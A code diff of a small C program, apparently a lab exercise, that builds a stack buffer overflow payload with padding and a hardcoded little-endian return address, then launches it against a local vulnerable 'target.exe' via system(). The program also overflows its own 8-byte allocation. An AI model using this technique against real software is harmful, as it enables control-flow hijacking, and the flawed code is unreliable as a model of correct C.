@@ -18,27 +18,26 @@ int main(int argc, char** argv){
     }
     int length = atoi(argv[1]);
 
-    printf("creating target.....");
-    system("gcc ./BufferOverflow.c -o target");
-    printf("done!\n");
+    //printf("creating target.....");
+    //system("gcc ./BufferOverflow.c -o target");
+    //printf("done!\n");
 
     char* buffer;
     char command[50] = "target.exe ";
-    char end[2] = "\n";
     char* returnPtr = malloc(8);
     buffer = createBuffert(length);
-    printf("buffert: %s\n", buffer);
     strcpy(returnPtr, "0x00401442");
+    printf("str : %s\n", returnPtr);
     returnPtr = addressToCharsAndFlip(returnPtr);
+    printf("str : %8s\n", returnPtr);
 
-    char* finishedCommandString = malloc(sizeof(command) + (sizeof(char) * length) + (sizeof(char) * 8) + sizeof(end));
-    strcpy(finishedCommandString, command);
-    strcat(finishedCommandString, buffer);
-    strcat(finishedCommandString, returnPtr);
-    strcat(finishedCommandString, end);
+    char* finishedCommandString = malloc(sizeof(command) + (sizeof(char) * length) + (sizeof(char) * 8));
+    sprintf(finishedCommandString, "%s%s%s\n", command, buffer, returnPtr);
 
     printf("final command: %s\n", finishedCommandString);
-    system(finishedCommandString);
+    printf("Starting attack\n");
+    int ret = system(finishedCommandString);
+    printf("\n\nAttack done exit %d\n", ret);
 
     //free Memory
     free(finishedCommandString);
